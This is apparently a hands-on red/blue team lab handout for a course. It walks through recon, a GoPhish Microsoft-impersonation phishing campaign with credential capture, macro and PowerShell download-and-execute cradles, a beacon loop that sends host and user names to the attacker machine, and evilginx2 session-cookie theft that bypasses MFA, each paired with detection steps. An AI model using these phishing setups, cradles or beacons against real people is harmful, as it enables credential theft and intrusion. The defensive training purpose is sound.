# Lesson 1 — Reconnaissance, Initial Access & Phishing
## Hands-On Lab

```
Kali (attacker)   $KALI_IP  ← set this once, used everywhere below
Windows (victim)  find with: ipconfig → IPv4 Address
Lab domain        redlab.local  →  $KALI_IP
```

**Set your IP once at the start of every session — all commands use `$KALI_IP`:**
```bash
source config.sh          # auto-detects your IP
echo $KALI_IP             # verify it looks right
```
If auto-detection picks the wrong interface, open `config.sh` and set `KALI_IP` manually.

---

## Pre-Lab — Setup

```bash
# Clone the repo onto Kali
git clone https://github.com/<your-org>/red4blue.git
cd red4blue/lesson1

# Run the one-time setup script
sudo bash setup/setup_lab.sh
```

The script installs: `httrack  theharvester  golang  evilginx2  python-docx  aiosmtpd`

```bash
# Verify nmap and gophish are present
nmap --version
gophish --version
```

**Windows victim — add to hosts file (run Notepad as Administrator):**
```
C:\Windows\System32\drivers\etc\hosts

$KALI_IP  redlab.local
```

Open **4 terminals** on Kali now — each module below says which terminal to use.

---

## Phase 1 — Passive Recon (OSINT)

> No packets touch the victim. Zero logs generated on their side.
>
> Replace `<TARGET>` with a domain you have permission to test,
> or use a real company's public data for classroom demo (whois/DNS are public record).

**Terminal 1**

```bash
# Set the target domain once — used in all commands below
TARGET=<TARGET>        # e.g. tesla.com for a live demo, or your own domain
```

```bash
# 1a. Who registered the domain? When? What name servers?
whois $TARGET
```

```bash
# 1b. DNS records — MX reveals mail provider, TXT reveals SPF (tells us email infra)
host -t MX  $TARGET
host -t TXT $TARGET
host -t NS  $TARGET
```

```bash
# 1c. Certificate transparency — every SSL cert is logged publicly
#     This leaks subdomains even if not in DNS
curl -s "https://crt.sh/?q=%25.$TARGET&output=json" \
  | python3 -c "
import json,sys
d=json.load(sys.stdin)
names={n for e in d for n in e.get('name_value','').split('\n') if n}
[print(n) for n in sorted(names)[:20]]
"
```

```bash
# 1d. theHarvester — emails + subdomains from public search engines
theHarvester -d $TARGET -b bing,crtsh -l 50
```

**Google Dorks — open in browser (show students on projector):**
```
site:<TARGET> filetype:pdf
site:<TARGET> inurl:login OR inurl:admin
site:linkedin.com/in "<company name>"
"@<TARGET>" site:pastebin.com
```

**Shodan — paste in browser:**
```
https://www.shodan.io/search?query=hostname%3A<TARGET>
https://www.shodan.io/search?query=org%3A%22<Company+Name>%22+port%3A3389
```

> **Blue team:** passive recon is invisible — the only defence is minimising public exposure
> (LinkedIn scrubbing, private WHOIS, monitoring crt.sh for rogue certs).

---

## Phase 2 — Active Recon (Network Scanning)

> **Blue team:** start Wireshark now → filter `ip.src == $KALI_IP`

**Terminal 1**

```bash
# Set the victim IP (run ipconfig on Windows to find it)
VICTIM=192.168.11.XXX
```

```bash
# 2a. Ping sweep — discover live hosts on the subnet
nmap -sn 192.168.11.0/24
```

```bash
# 2b. Fast port scan — what services are running?
nmap -sV -T4 --open $VICTIM
```

```bash
# 2c. OS detection + default scripts
sudo nmap -O -sV -sC $VICTIM
```

```bash
# 2d. Windows-specific ports
nmap -sV -p 80,443,135,139,445,3389,5985,8080 $VICTIM
```

```bash
# 2e. Aggressive scan — intentionally noisy, triggers IDS
sudo nmap -A -T4 $VICTIM
```

> **Blue team — what you see in Wireshark:**
> - Burst of SYN packets to many ports from the same source IP
> - ICMP echo requests across the whole subnet
> - Unusual TCP options (nmap OS fingerprinting probes)
>
> **Blue team — enable Windows Firewall logging (run on victim):**
> ```powershell
> netsh advfirewall set allprofiles logging droppedconnections enable
> netsh advfirewall set allprofiles logging filename C:\fw.log
> ```
> Then: `Get-Content C:\fw.log | Select-String "$KALI_IP"`

---

## Phase 3 — Start Attack Infrastructure

Start these in three separate terminals and leave them running for the rest of the lesson.

**Terminal 1 — GoPhish**
```bash
sudo gophish
# Dashboard → https://127.0.0.1:3333
# Login:  admin / kali-gophish   (change password on first login)
```

**Terminal 2 — SMTP relay (captures emails GoPhish sends)**
```bash
python3 tools/smtp_server.py
# Listens on 127.0.0.1:1025
```

**Terminal 3 — Payload HTTP server**
```bash
python3 tools/http_server.py
# Listens on 0.0.0.0:8080
# Fake login page → http://$KALI_IP:8080/
```

---

## Phase 4 — Phishing Campaign (GoPhish)

Open **https://127.0.0.1:3333** in your browser. Follow these steps.

### 4-A · Sending Profile

```
Sending Profiles → New Profile

  Name:         Lab SMTP Relay
  From:         "Microsoft Security" <noreply@microsoft-support.com>
  Host:         127.0.0.1
  Port:         1025
  Username:     (leave blank)
  Password:     (leave blank)
  TLS:          unchecked
  Ignore Errors: checked

→ Save Profile
```

Test: click **Send Test Email** and enter your own address — watch Terminal 2 log it.

### 4-B · Landing Page

```
Landing Pages → New Page

  Name:   Microsoft Login Clone

  Option A — import live:
    Import Site → http://$KALI_IP:8080/
    (pulls templates/fake_login.html from our server)

  Option B — paste HTML:
    HTML tab → paste content of templates/fake_login.html

  ✓  Capture Submitted Data
  ✓  Capture Passwords
  Redirect To:  https://login.microsoftonline.com

→ Save Page
```

### 4-C · Email Template

```
Email Templates → New Template

  Name:    Microsoft 365 Security Alert
  Subject: [ACTION REQUIRED] Unusual sign-in activity detected
  HTML:    paste content of templates/phishing_email.html
  ✓  Add Tracking Image

→ Save Template
```

### 4-D · Users & Groups

```
Users & Groups → New Group

  Name: Lab Victims
  Add Target:
    First:    Victim
    Last:     User
    Email:    <Windows user email or any real inbox you control>
    Position: IT Manager

→ Save Changes
```

### 4-E · Launch Campaign

```
Campaigns → New Campaign

  Name:            Lesson1-Phishing
  Email Template:  Microsoft 365 Security Alert
  Landing Page:    Microsoft Login Clone
  URL:             http://$KALI_IP:8080
  Launch Date:     (now)
  Sending Profile: Lab SMTP Relay
  Groups:          Lab Victims

→ Launch Campaign
```

### 4-F · Watch results roll in

```
Dashboard → click campaign name

Live stats:
  Email Sent         ● appears immediately
  Email Opened       ● victim opens email (tracking pixel)
  Clicked Link       ● victim clicks the button
  Submitted Data     ● credentials captured!

Click "Submitted Data" to view: username · password
```

> **Blue team — email header analysis (open the phishing email on Windows):**
> ```
> View: File → Properties → Internet Headers (Outlook)
>
> Check:
>   From:         noreply@microsoft-support.com  ← NOT microsoft.com
>   Return-Path:  same spoofed domain
>   Received:     shows $KALI_IP (our Kali) as origin
>   Authentication-Results: spf=none  dkim=none  dmarc=none
> ```

---

## Phase 5 — Fake Login Page / Site Cloning

**Terminal 4**

```bash
# Method A — wget: grab a single login page and rewrite links
wget -q --page-requisites --convert-links \
     --directory-prefix=/tmp/clone \
     "http://testphp.vulnweb.com/login.php"

ls /tmp/clone/
```

```bash
# Method B — httrack: full recursive clone (better fidelity)
httrack "http://testphp.vulnweb.com/login.php" \
    -O /tmp/clone_full -%v --depth=1 --robots=0
```

```bash
# Serve the clone on port 9090 for comparison
cd /tmp/clone && python3 -m http.server 9090
# Victim visits: http://$KALI_IP:9090/
```

Show students side-by-side: real site vs cloned — they look identical.

> **Blue team red flags:**
> - Address bar URL ≠ real domain
> - No padlock / SSL cert not issued to the real company
> - Browser password manager does not autofill (domain mismatch)

---

## Phase 6 — Payload Delivery

### 6-A · Macro document (concept + demo)

**Terminal 4**

```bash
# Create the decoy Word doc and print the VBA macro
python3 tools/create_macro_doc.py

# Read the macro code together with students
cat payloads/macro_code.vba
```

Walk through the VBA line by line:
- `AutoOpen()` — fires the moment victim clicks Enable Content
- `Shell "cmd.exe /c calc.exe"` — the "payload" (harmless here)
- The PowerShell beacon line — how it calls home

**On Windows victim (demonstrate the attachment flow):**
```
1. Transfer payloads/invoice_Q4_2024.docx to Windows
   (drag-drop, shared folder, or:)
```
```powershell
# On Windows — download it from Kali
Invoke-WebRequest -Uri "http://$KALI_IP:8080/payloads/invoice_Q4_2024.docx" `
                  -OutFile "$env:TEMP\invoice_Q4_2024.docx"
```
```
2. Open the file → "Enable Content" button appears
3. Alt+F11 → paste macro_code.vba into ThisDocument → save as .docm
4. Reopen → click Enable Content → Calculator opens
5. Check %TEMP%\macro_ran.txt
```

### 6-B · PowerShell download cradle

**On Windows victim (run each command, one at a time):**
```powershell
# Show what URL we're hitting
$url = "http://$KALI_IP:8080/payloads/calc_payload.ps1"
```
```powershell
# Download with WebClient (most compatible)
(New-Object System.Net.WebClient).DownloadFile($url, "$env:TEMP\s2.ps1")
```
```powershell
# Execute it
powershell -ExecutionPolicy Bypass -File "$env:TEMP\s2.ps1"
```

Watch **Terminal 3** (http_server.py) log the download and beacon.

```powershell
# Show the LOLBin alternative — certutil (built-in Windows tool, not powershell)
certutil -urlcache -split -f $url "$env:TEMP\s2_cert.ps1"
powershell -ExecutionPolicy Bypass -File "$env:TEMP\s2_cert.ps1"
```

```powershell
# Fileless — payload never touches disk (hardest to detect)
IEX (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
```

---

## Phase 7 — C2 Beacon

**On Windows victim:**
```powershell
# Copy beacon.py to Windows first, then:
python3 tools/beacon.py
```

**If Python not on Windows, use PowerShell loop:**
```powershell
while ($true) {
    $qs = "host=$env:COMPUTERNAME&user=$env:USERNAME"
    Invoke-WebRequest -Uri "http://$KALI_IP:8080/beacon?$qs" `
                      -UseBasicParsing | Out-Null
    Write-Host "[$(Get-Date -f 'HH:mm:ss')] beacon sent"
    Start-Sleep -Seconds 10
}
```

Watch **Terminal 3** — every 10 seconds:
```
  [!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!]
  [BEACON] 14:32:01 from 192.168.11.XXX
    host: VICTIM-PC
    user: Administrator
    n: 1
  [!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!]
```

> **Blue team discussion:** what makes this suspicious?
> - Regular HTTP requests at fixed interval from a non-browser process
> - `python.exe` or `powershell.exe` making outbound HTTP
> - Traffic during off-hours or when user is idle
> - Small consistent payloads (no real web browsing pattern)

---

## Phase 8 — Blue Team Investigation

Students switch roles. Kali terminals stay running. All commands run **on Windows victim.**

### Find the payload artifacts
```powershell
# What files did the attacker leave?
Get-ChildItem $env:TEMP | Sort-Object LastWriteTime -Descending | Select -First 20
Get-Content "$env:TEMP\red4blue_pwned.txt"
Get-Content "$env:TEMP\macro_ran.txt"
```

### Find network connections to attacker
```powershell
# Any active connections to $KALI_IP?
Get-NetTCPConnection -State Established |
    Where-Object RemoteAddress -eq "$KALI_IP"

# What process owns those connections?
Get-NetTCPConnection -State Established |
    Where-Object RemoteAddress -eq "$KALI_IP" |
    ForEach-Object {
        [PSCustomObject]@{
            Process = (Get-Process -Id $_.OwningProcess).Name
            PID     = $_.OwningProcess
            Port    = $_.RemotePort
        }
    }
```

### Check firewall log for port scan
```powershell
Get-Content "C:\fw.log" | Select-String "DROP" | Select -Last 30
# Look for rapid-fire entries from $KALI_IP
```

### Enable and read PowerShell script block logs
```powershell
# Enable logging (if not already)
$p = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
New-Item $p -Force | Out-Null
Set-ItemProperty $p -Name EnableScriptBlockLogging -Value 1

# Read recent entries (Event ID 4104)
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" |
    Where-Object Id -eq 4104 |
    Select-Object -First 10 |
    Format-List TimeCreated, Message
```

### Check process creation (who spawned what)
```powershell
# Security log — process creation (needs audit policy enabled)
Get-WinEvent -LogName Security |
    Where-Object Id -eq 4688 |
    Select-Object -First 20 |
    Format-List TimeCreated, Message
```

### Check scheduled tasks and registry run keys (persistence)
```powershell
# New scheduled tasks (not Microsoft)
Get-ScheduledTask | Where-Object TaskPath -notlike "\Microsoft*"

# Registry autostart
Get-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
```

### Review what GoPhish captured (back on Kali — Terminal 1)
```bash
# Credentials submitted via fake login page
cat captured_credentials.log

# Emails captured by SMTP relay
cat smtp_captured.log
```

---

## Evilginx2 — AiTM Demo  *(bonus if time allows)*

Evilginx2 proxies the REAL site — victim sees no fake page but
we capture credentials **and** session cookies (bypasses MFA).

```bash
# Start evilginx (developer mode — no real domain needed)
sudo evilginx -developer -p /opt/evilginx2/phishlets/
```

```
# Inside evilginx console
config domain redlab.local
config ip $KALI_IP
phishlets hostname o365 redlab.local
phishlets enable o365
lures create o365
lures get-url 0
```

Send the lure URL to the victim. After they log in:
```
sessions        # list captured sessions
sessions 1      # show credentials + session cookies
```

See `lesson1/setup/evilginx_notes.md` for full phishlet setup.

---

## Quick Reference

| What | Command |
|------|---------|
| GoPhish dashboard | `https://127.0.0.1:3333` · `admin` / `kali-gophish` |
| Start SMTP relay | `python3 tools/smtp_server.py` |
| Start HTTP server | `python3 tools/http_server.py` |
| Fake login page | `http://$KALI_IP:8080/` |
| Download calc payload | `http://$KALI_IP:8080/payloads/calc_payload.ps1` |
| Captured credentials | `cat captured_credentials.log` |
| Ping sweep | `nmap -sn 192.168.11.0/24` |
| Fast port scan | `nmap -sV -T4 --open $VICTIM` |
| Aggressive scan | `sudo nmap -A -T4 $VICTIM` |

---

## IOC Cheatsheet

| Indicator | Type | Source |
|-----------|------|--------|
| `$KALI_IP` making port scan | Network | Wireshark / fw.log |
| Email from `*-support.com` not `microsoft.com` | Email header | SPF/DKIM fail |
| `powershell.exe` → outbound HTTP to `:8080` | Process + Network | Sysmon / netstat |
| `WINWORD.EXE` → `cmd.exe` → `powershell.exe` | Process tree | Sysmon Event 1 |
| `%TEMP%\red4blue_pwned.txt` | File | Filesystem |
| `%TEMP%\macro_ran.txt` | File | Filesystem |
| Periodic HTTP GET `/beacon?...` every ~10s | Network | Zeek / Wireshark |
